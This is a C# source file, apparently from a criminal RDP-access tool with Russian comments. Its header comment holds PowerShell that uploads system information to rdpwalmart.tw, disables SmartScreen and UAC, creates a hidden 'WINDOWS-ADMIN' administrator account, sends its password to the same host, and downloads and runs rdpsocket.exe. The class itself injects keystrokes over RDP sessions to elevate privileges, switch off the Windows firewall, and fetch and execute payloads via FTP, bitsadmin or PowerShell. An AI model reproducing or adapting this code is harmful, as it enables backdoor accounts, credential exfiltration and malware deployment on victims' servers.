using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.IO.IsolatedStorage;

/*
    //checker rdp
	$isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent())
	 .IsInRole([System.Security.Principal.WindowsBuiltInRole] "Administrator");
	
    if($isAdmin -eq $true) { $isAdmin = 1;} else { $isAdmin = 0;} 
    $values = (New-Object System.Collections.Specialized.NameValueCollection); $values.Add("ipconfig", (ipconfig)); $values.Add("is_admin", $isAdmin); $values.Add("systeminfo", (systeminfo)); $values.Add("software", (Get-WmiObject -Class Win32_Product | Select-Object -Property Name)); 
    (New-Object System.Net.WebClient).UploadValues("https://rdpwalmart.tw/RDPWalMart/addCheckRDPServer", $values);
	

	//disable smartscreen,uac,create user account,notify new server brute
	$isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent())
	.IsInRole([System.Security.Principal.WindowsBuiltInRole] "Administrator");
	if($isAdmin -eq $true) { 
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name EnableSmartScreen -Value 0; 
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0 
		
		$hasUser = net user WINDOWS-ADMIN; 

		if(-not($hasUser -match "WINDOWS-ADMIN")) {
			Add-Type -AssemblyName System.Web;
			$password = [System.Web.Security.Membership]::GeneratePassword(11, 0); net user "WINDOWS-ADMIN" $password /add /y /expires:never;
			net localgroup "Administrators" "Remote Desktop Users" "WINDOWS-ADMIN" /add;

			$hasUser = net user WINDOWS-ADMIN; 
			if($hasUser -match "WINDOWS-ADMIN") { (New-Object System.Net.WebClient).DownloadString("https://rdpwalmart.tw/RDPWalMart/addServer?login=WINDOWS-ADMIN&password="+[System.Web.HttpUtility]::UrlEncode($password)); shutdown.exe /r }
		}
	}
		
	//download and run rdpsocket.zip
	//Get-ItemProperty -Path "HKCU:\Software\RDPSocket" -Name RUN_DATETIME
	if([System.IO.Directory]::Exists("C:\\ProgramData\\Microsoft\\Windows\\rdpsocket") -eq $true) {
		Stop-Process -processname javaw;
		Start-Sleep -m 400;
		[System.IO.Directory]::Delete("C:\\ProgramData\\Microsoft\\Windows\\rdpsocket", $true)
	}

	(New-Object System.Net.WebClient).DownloadFile("test file", "C:\\ProgramData\\Microsoft\\Windows\\rdpsocket.zip");
	Add-Type -AssemblyName System.IO.Compression.FileSystem; 
	[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\\ProgramData\\Microsoft\\Windows\\rdpsocket.zip', 'C:\\ProgramData\\Microsoft\\Windows')
	[System.IO.File]::Delete("C:\\ProgramData\\Microsoft\\Windows\\rdpsocket.zip");
	Unblock-File C:\\ProgramData\\Microsoft\\Windows\\rdpsocket\\rdpsocket.exe;
	C:\\ProgramData\\Microsoft\\Windows\\rdpsocket\\rdpsocket.exe;

    if([System.IO.Directory]::Exists("C:\\ProgramData\\Microsoft\\Windows\\rdpsocket") -eq $true) { Stop-Process -processname javaw; Start-Sleep -m 400; [System.IO.Directory]::Delete("C:\\ProgramData\\Microsoft\\Windows\\rdpsocket", $true); } (New-Object System.Net.WebClient).DownloadFile("https://rdpwalmart.tw/rdpsocket.zip", "C:\\ProgramData\\Microsoft\\Windows\\rdpsocket.zip"); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\\ProgramData\\Microsoft\\Windows\\rdpsocket.zip', 'C:\\ProgramData\\Microsoft\\Windows'); [System.IO.File]::Delete("C:\\ProgramData\\Microsoft\\Windows\\rdpsocket.zip"); Unblock-File C:\\ProgramData\\Microsoft\\Windows\\rdpsocket\\rdpsocket.exe; C:\\ProgramData\\Microsoft\\Windows\\rdpsocket\\rdpsocket.exe;

	*/

namespace RdpUploadClient.InputKeys
{
    internal static class Input
    {
        // Загрузить и запустить файл через FTP
        internal static void LoadAndRunFileFromFTP(string ip, string login, string password, string filePath, int timeout, int loadTimeout, string fileParams)
        {
            Thread.Sleep(timeout);

            WinM();

            Thread.Sleep(timeout);

            // Отключаем брендмауэр
            DisableFirewall(timeout);

            // Открываем командную строку
            OpenCmd(timeout);

            // ftp
            Unicode.SendString("ftp");
            Enter();

            Thread.Sleep(1000);

            // open IP
            Unicode.SendString("open " + ip.Trim());
            Enter();

            Thread.Sleep(1000);

            // user
            Unicode.SendString(login);
            Enter();

            Thread.Sleep(1000);

            // password
            Unicode.SendString(password);
            Enter();

            Thread.Sleep(1000);

            // transfer mode
            Unicode.SendString("binary");
            Enter();

            Thread.Sleep(1000);

            // Pasv mode
            Unicode.SendString("quote PASV");
            Enter();

            Thread.Sleep(1000);

            // get
            Unicode.SendString("get " + filePath);
            Enter();

            Thread.Sleep(loadTimeout);

            // bye
            Unicode.SendString("bye");
            Enter();

            Thread.Sleep(1000);

            RunFile(Path.GetFileName(filePath), fileParams);

            Thread.Sleep(timeout);

            CloseCmd(timeout);

            Thread.Sleep(timeout);

            Unicode.SendString(@"exit");
            Enter();

            Thread.Sleep(timeout);

            WinShiftM();
        }

        // Загрузить и запустить файл через монтирование диска
        internal static void LoadAndRunFileFromDrive(string fileName, int timeout, int loadTimeout, string fileParams)
        {
            Thread.Sleep(timeout);

            WinM();

            Thread.Sleep(timeout);

            CopyFileFromStorage1(fileName, loadTimeout, timeout);

            CopyFileFromStorage2(fileName, loadTimeout, timeout, fileParams);

            Thread.Sleep(timeout);

            CloseCmd(timeout);

            Thread.Sleep(timeout);

            WinShiftM();
        }

        // Загрузить и запустить файл через буфер обмена
        internal static void LoadAndRunFileFromClipboard(int timeout, int loadTimeout, string fileParams)
        {
            if (string.IsNullOrWhiteSpace(fileParams))
            {
                Thread.Sleep(timeout);

                WinM();

                Thread.Sleep(timeout);

                CtrlV();

                Thread.Sleep(loadTimeout);

                Enter();

                Thread.Sleep(timeout);

                WinShiftM();
            }
        }

        // Загрузить и запустить файл через HTTP с помощью bitsadmin.exe 
        internal static void LoadAndRunFileFromHTTP_BA(string url, int timeout, int loadTimeout, string fileParams)
        {
            Thread.Sleep(timeout);
            WinM();

            // Открываем командную строку
            OpenCmd(timeout);

            Unicode.SendString(@"bitsadmin /transfer System /Download /Priority FOREGROUND " + url.Trim() + @" %TEMP%\" + Path.GetFileName(url));
            Thread.Sleep(timeout);
            Enter();
            Thread.Sleep(loadTimeout);

            // Открываем командную строку
            OpenCmd(timeout);

            RunFile(@"%TEMP%\" + Path.GetFileName(url.Trim()), fileParams);
            Thread.Sleep(timeout);

            CloseCmd(timeout);
            Thread.Sleep(timeout);

            WinShiftM();
        }

        // Загрузить и запустить файл через HTTP с помощью powershell 
        internal static void LoadAndRunFileFromHTTP_PS(string powerShellScriptText, int timeout, int loadTimeout)
        {
            Thread.Sleep(timeout);
            WinM();

            // Открываем командную строку
            OpenCmd(timeout);
            
            Unicode.SendString(@""+powerShellScriptText);

            Thread.Sleep(timeout);
            Enter();
            
            Thread.Sleep(timeout);

            WinShiftM();
        }

        // Скопировать файл
        private static void CopyFileFromStorage1(string localFileName, int loadTimeout, int timeout)
        {
            OpenCmd(timeout);

            Unicode.SendString(@"net use m: \\tsclient\storage\");
            Enter();
            Thread.Sleep(timeout);

            // Обновляем файловый канал
            var fileChannel = new FileSystemChannel(RDPClient.CurrentHost.FSDeviceName,  RDPClient.CurrentHost.FSDriveName);
            fileChannel.sendClientCapability();
            Thread.Sleep(timeout + 3000);

            Unicode.SendString(@"copy /Y m:\" + localFileName);
            Enter();
            Thread.Sleep(loadTimeout);
        }

        // Скопировать файл
        private static void CopyFileFromStorage2(string localFileName, int loadTimeout, int timeout, string fileParams)
        {
            OpenCmd(timeout);

            // Обновляем файловый канал
            var fileChannel = new FileSystemChannel(RDPClient.CurrentHost.FSDeviceName, RDPClient.CurrentHost.FSDriveName);
            fileChannel.sendClientCapability();
            Thread.Sleep(loadTimeout);

            //Unicode.SendString(@"copy /Y \\tsclient\drive\" + localFileName);
            //Thread.Sleep(timeout);
            //Enter();

            RunFile(@"\\tsclient\drive\" + localFileName, fileParams);
        }

        // Отключение брендмауэра
        internal static void DisableFirewall(int timeout)
        {
            // Открываем командную строку с правами администратора
            OpenCmdAsAdmin(timeout);

            // Стрелка влево
            ScanCode.SendKeyEx(0x4B);
            Thread.Sleep(timeout);
            Enter();
            Thread.Sleep(timeout);

            // Отключаем брендмауэр для старых версий Windows
            Unicode.SendString("netsh firewall set opmode disable");
            Enter();
            Thread.Sleep(timeout);

            // Отключаем брендмауэр для новых версий Windows
            Unicode.SendString("netsh advfirewall set allprofiles state off");
            Enter();
            Thread.Sleep(timeout);

            // Очищаем командную строку
            ClearCmd(timeout);
        }

        // Открыть командную строку
        internal static void OpenCmd(int timeout)
        {
            Thread.Sleep(timeout);
            WinR();
            Thread.Sleep(timeout);

            Unicode.SendString("cmd.exe");
            Enter();
            Thread.Sleep(timeout);
        }

        // Открываем командную строку с правами администратора
        internal static void OpenCmdAsAdmin(int timeout)
        {
            OpenCmd(timeout);

            Unicode.SendString("powershell");
            Enter();

            Thread.Sleep(timeout);

            Unicode.SendString("Start-Process 'cmd.exe' -Verb RunAs");
            Enter();

            Thread.Sleep(timeout);
        }

        // Закрыть командную строку
        internal static void CloseCmd(int timeout)
        {
            OpenCmd(timeout);
            Unicode.SendString(@"taskkill /IM cmd.exe");
            Enter();

            Thread.Sleep(timeout);
        }

        // Очистить командную строку
        internal static void ClearCmd(int timeout)
        {
            Unicode.SendString("cls");
            Enter();

            Thread.Sleep(timeout);
        }

        // Запустить файл
        internal static void RunFile(string fileName, string fileParams)
        {
            // Run
            if(!string.IsNullOrWhiteSpace(fileParams))
                Unicode.SendString(fileName + " " + fileParams);
            else
                Unicode.SendString(fileName);
            Enter();
        }

        // Win+R
        internal static void WinR()
        {
            if (Network.ConnectionAlive)
            {
                ScanCode.SendKeyExOn(0x5B);
                ScanCode.SendKey(0x13);
                ScanCode.SendKeyExOff(0x5B);
            }
        }

        // Win+M
        internal static void WinM()
        {
            if (Network.ConnectionAlive)
            {
                ScanCode.SendKeyExOn(0x5B);
                ScanCode.SendKey(0x32);
                ScanCode.SendKeyExOff(0x5B);
            }
        }

        // Win+Shift+M
        internal static void WinShiftM()
        {
            if (Network.ConnectionAlive)
            {
                ScanCode.SendKeyExOn(0x5B);
                ScanCode.SendKeyOn(0x2A);
                ScanCode.SendKey(0x32);
                ScanCode.SendKeyOff(0x2A);
                ScanCode.SendKeyExOff(0x5B);
            }
        }

        // Enter
        internal static void Enter()
        {
            if (Network.ConnectionAlive)
            {
                ScanCode.SendKeyEx(0x1C);
            }
        }

        // Alt+Shift
        internal static void AltShift()
        {
            if (Network.ConnectionAlive)
            {
                ScanCode.SendKeyOn(0x38);
                ScanCode.SendKey(0x2A);
                ScanCode.SendKeyOff(0x38);
            }
        }

        // Ctrl+Shift
        internal static void CtrlShift()
        {
            if (Network.ConnectionAlive)
            {
                ScanCode.SendKeyOn(0x1D);
                ScanCode.SendKey(0x2A);
                ScanCode.SendKeyOff(0x1D);
            }
        }

        // Ctrl+V
        internal static void CtrlV()
        {
            if (Network.ConnectionAlive)
            {
                ScanCode.SendKeyOn(0x1D);
                ScanCode.SendKey(0x2F);
                ScanCode.SendKeyOff(0x1D);
            }
        }

    }
}